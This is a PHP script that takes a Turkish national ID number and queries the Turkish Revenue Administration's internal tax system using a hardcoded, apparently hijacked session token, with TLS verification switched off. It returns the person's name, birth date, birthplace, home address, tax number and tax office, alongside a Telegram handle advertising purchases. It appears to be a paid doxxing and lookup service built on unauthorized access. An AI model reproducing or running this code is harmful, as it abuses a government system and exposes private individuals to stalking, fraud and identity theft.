<?php

// Get the visitor's IP address
header('Content-Type: application/json');

// Enable error logging to a file
ini_set('log_errors', 1);
ini_set('error_log', 'api_log.log');

$tc = $_GET['tc'];
$auth_keys = ["illegaltoplumozel", "v0001"];
$auth = $_GET['auth'] ?? null;
$ironclad = "4c5f2defdfc19428ece62f9f3544feec8d7a13ec195abb8a56639486460a262ce0c704feaea33ac7844af6f244d2ebdaae7ed6d722559c9f1811f2456a54de5a";

$url = "https://intvrg.gib.gov.tr/intvrg_server/dispatch";
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$ironcladdata = "cmd=kimlikBilgileriIslemleri_kimlikBilgileriSorgula&callid=90faf529ffd5a-74&token=$ironclad&jp=%7B%22mukellefVergiNo%22%3A%22%22%2C%22mukellefTCKimlikNo%22%3A%22$tc%22%2C%22arac%C4%B1l%C4%B1kSozlesmeTipi%22%3A%220%22%7D";

$header = array(
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Content-Length: 327',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'Referer: https://intvrg.gib.gov.tr/intvrg_side/main.jsp?token=4c5f2defdfc19428ece62f9f3544feec8d7a13ec195abb8a56639486460a262ce0c704feaea33ac7844af6f244d2ebdaae7ed6d722559c9f1811f2456a54de5a ',
    'Host: intvrg.gib.gov.tr',
    'Origin: https://intvrg.gib.gov.tr',
    'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
);

curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
curl_setopt($curl, CURLOPT_POSTFIELDS, $ironcladdata);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$sonuc = curl_exec($curl);
if ($sonuc === false) {
    // Log the curl error
    error_log('Curl error: ' . curl_error($curl));
    echo json_encode(['error' => 'Curl error: ' . curl_error($curl)], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
} else {
    curl_close($curl);
    $sonuc = "[" . $sonuc . "]";

    $son = $sonuc;
    $decoded = json_decode($son, true);
    if ($decoded === null) {
        // Log the JSON decoding error
        error_log('JSON decoding error');
        echo json_encode(['error' => 'JSON decoding error'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    } else {
        foreach ($decoded as $row) {
            $tckn = isset($row['data']['mukellef_tckimlikno']) ? $row['data']['mukellef_tckimlikno'] : 'Null!';
            $ad = isset($row['data']['mukellef_ad']) ? $row['data']['mukellef_ad'] : 'Null!';
            $dt = isset($row['data']['mukellef_dogum_tarihi']) ? $row['data']['mukellef_dogum_tarihi'] : 'Null!';
            $dy = isset($row['data']['mukellef_dogum_yeri']) ? $row['data']['mukellef_dogum_yeri'] : 'Null!';
            $adres = isset($row['data']['mukellef_adres']) ? $row['data']['mukellef_adres'] : 'Null!';
            $vergino = isset($row['data']['mukellef_vergino']) ? $row['data']['mukellef_vergino'] : 'Null!';
            $vdadi = isset($row['data']['mukellef_vdkodu']['vergidaireleri'][0]['vdadi']) ? $row['data']['mukellef_vdkodu']['vergidaireleri'][0]['vdadi'] : 'Null!';
            $vdkodu = isset($row['data']['mukellef_vdkodu']['vergidaireleri'][0]['vdkodu']) ? $row['data']['mukellef_vdkodu']['vergidaireleri'][0]['vdkodu'] : 'Null!';
        }
        $cityPlates = [
            "1" => "Adana",
            "2" => "Adıyaman",
            "3" => "Afyonkarahisar",
            "4" => "Ağrı",
            "5" => "Amasya",
            "6" => "Ankara",
            "7" => "Antalya",
            "8" => "Artvin",
            "9" => "Aydın",
            "10" => "Balıkesir",
            "11" => "Bilecik",
            "12" => "Bingöl",
            "13" => "Bitlis",
            "14" => "Bolu",
            "15" => "Burdur",
            "16" => "Bursa",
            "17" => "Çanakkale",
            "18" => "Çankırı",
            "19" => "Çorum",
            "20" => "Denizli",
            "21" => "Diyarbakır",
            "22" => "Edirne",
            "23" => "Elazığ",
            "24" => "Erzincan",
            "25" => "Erzurum",
            "26" => "Eskişehir",
            "27" => "Gaziantep",
            "28" => "Giresun",
            "29" => "Gümüşhane",
            "30" => "Hakkari",
            "31" => "Hatay",
            "32" => "Isparta",
            "33" => "Mersin",
            "34" => "İstanbul",
            "35" => "İzmir",
            "36" => "Kars",
            "37" => "Kastamonu",
            "38" => "Kayseri",
            "39" => "Kırklareli",
            "40" => "Kırşehir",
            "41" => "Kocaeli",
            "42" => "Konya",
            "43" => "Kütahya",
            "44" => "Malatya",
            "45" => "Manisa",
            "46" => "Kahramanmaraş",
            "47" => "Mardin",
            "48" => "Muğla",
            "49" => "Muş",
            "50" => "Nevşehir",
            "51" => "Niğde",
            "52" => "Ordu",
            "53" => "Rize",
            "54" => "Sakarya",
            "55" => "Samsun",
            "56" => "Siirt",
            "57" => "Sinop",
            "58" => "Sivas",
            "59" => "Tekirdağ",
            "60" => "Tokat",
            "61" => "Trabzon",
            "62" => "Tunceli",
            "63" => "Şanlıurfa",
            "64" => "Uşak",
            "65" => "Van",
            "66" => "Yozgat",
            "67" => "Zonguldak",
            "68" => "Aksaray",
            "69" => "Bayburt",
            "70" => "Karaman",
            "71" => "Kırıkkale",
            "72" => "Batman",
            "73" => "Şırnak",
            "74" => "Bartın",
            "75" => "Ardahan",
            "76" => "Iğdır",
            "77" => "Yalova",
            "78" => "Karabük",
            "79" => "Kilis",
            "80" => "Osmaniye",
            "81" => "Düzce",
        ];
        $cityPlates = array_map('strtoupper', $cityPlates);

// ... Your existing code ...

$addressParts = explode(' ', $adres);
$lastPart = end($addressParts); // Get the last part (city plate)

$lastDigit = intval($lastPart);
$cityName = $cityPlates[$lastDigit] ?? "Unknown";

array_pop($addressParts); // Remove the last part (city plate)
$addressWithoutLastPart = implode(' ', $addressParts);
$adWords = explode(' ', $ad);
$firstWordWithoutLast = implode(' ', array_slice($adWords, 0, -1));

$addressWithCity = $addressWithoutLastPart . ' - ' . $cityName;
        $newData = [
            'bilgi' => 'Satın Alımlar İçin TG: STEELSERİESCF',
            '------------------------------------------------' => '',
            'ad' => $firstWordWithoutLast,
            'soyad' => end($adWords),
            'dogumtarihi' => $dt,
            'dogumyeri' => $dy,
            'adres' => $addressWithCity,
            'vergino' => $vergino,
            'vergidairesiadi' => $vdadi,
            'vergikodu' => $vdkodu
        ];

        echo json_encode($newData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

        // Log the successful request
        $logMessage = "Request from IP: " . $_SERVER['REMOTE_ADDR'] . " - Data: " . json_encode($newData);
        error_log($logMessage);
    }
}

?>
